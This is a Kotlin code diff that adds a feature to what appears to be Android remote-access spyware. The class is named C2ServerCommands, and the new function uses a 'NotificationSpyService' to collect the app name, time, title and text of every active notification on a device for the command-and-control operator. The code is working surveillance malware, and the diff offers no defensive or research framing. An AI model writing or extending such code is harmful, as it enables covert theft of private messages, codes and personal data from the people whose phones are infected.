@@ -423,5 +423,44 @@ class C2ServerCommands(private val context: Context) {
             .build()
         notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
     }
-}
 
+    fun getActiveNotifications(): String {
+        val service = NotificationSpyService.instance
+        if (service == null) {
+            return "Notification listener service not active. Notification access might be denied."
+        }
+
+        val notifications = service.getActiveNotificationsList()
+        if (notifications.isEmpty()) {
+            return "No active notifications found."
+        }
+
+        val sb = StringBuilder()
+        val pm = context.packageManager
+        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
+
+        for (sbn in notifications) {
+            val packageName = sbn.packageName
+            val appName = try {
+                val appInfo = pm.getApplicationInfo(packageName, 0)
+                pm.getApplicationLabel(appInfo).toString()
+            } catch (e: Exception) {
+                "Unknown App"
+            }
+
+            val postTime = sbn.postTime
+            val timeString = dateFormat.format(java.util.Date(postTime))
+
+            val extras = sbn.notification.extras
+            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: "No Title"
+            val text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: "No Text"
+
+            sb.append("Package: $packageName ($appName)\n")
+            sb.append("Time: $timeString\n")
+            sb.append("Title: $title\n")
+            sb.append("Text: $text\n")
+            sb.append("----------------------------\n")
+        }
+        return sb.toString().trim()
+    }
+}
